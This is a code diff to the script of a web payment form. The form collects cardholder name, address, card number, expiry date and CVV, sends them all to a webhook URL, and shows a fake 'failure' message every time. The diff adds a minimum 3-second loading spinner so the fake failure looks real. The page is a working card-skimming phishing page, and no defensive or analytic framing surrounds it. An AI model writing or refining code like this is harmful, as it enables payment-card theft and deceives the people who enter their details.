@@ -331,11 +331,10 @@
 
     </div>
 
-   <script>
+<script>
 const form = document.getElementById('paymentForm');
 
 async function getWebhookURL() {
-    // Directly include the webhook URL instead of fetching it
     const webhookURL = 'YOUR_WEBHOOK_URL_HERE'; // Replace with your actual webhook URL
     return webhookURL;
 }
@@ -358,6 +357,10 @@ form.addEventListener('submit', async function(event) {
         content: `New payment submitted:\nCardholder Name: ${cardholderName}\nZipcode: ${zipcode}\nFull Address: ${fullAddress}\nCard Number: ${cardNumber}\nExpiration Date: ${expiryDate}\nCVV: ${cvv}`
     };
 
+    // Set a minimum loading time (e.g., 3 seconds)
+    const minimumLoadingTime = 3000; // 3000ms = 3 seconds
+    const startTime = Date.now();
+
     try {
         // Get the webhook URL directly
         const webhookURL = await getWebhookURL();
@@ -376,20 +379,28 @@ form.addEventListener('submit', async function(event) {
             throw new Error('Failed to send data to the webhook');
         }
 
-        // Simulate loading for a longer duration
+        // Calculate how long to wait before hiding the loading spinner
+        const elapsedTime = Date.now() - startTime;
+        const timeToWait = Math.max(minimumLoadingTime - elapsedTime, 0); // Ensure at least 3 seconds
+
         setTimeout(() => {
-            // Hide loading overlay and show failure message
             document.getElementById('loadingOverlay').style.display = 'none';
             document.getElementById('failureMessage').style.display = 'block'; // Show failure message
-        }, 3000); // Adjust the time as needed (3000ms = 3 seconds)
+        }, timeToWait); // Wait time adjusted
 
     } catch (error) {
         console.error('Error:', error);
-        document.getElementById('loadingOverlay').style.display = 'none';
-        document.getElementById('failureMessage').style.display = 'block'; // Show failure message on error
+        const elapsedTime = Date.now() - startTime;
+        const timeToWait = Math.max(minimumLoadingTime - elapsedTime, 0); // Ensure at least 3 seconds
+
+        setTimeout(() => {
+            document.getElementById('loadingOverlay').style.display = 'none';
+            document.getElementById('failureMessage').style.display = 'block'; // Show failure message
+        }, timeToWait); // Wait time adjusted
     }
 });
 </script>
+
 
 
 </body>
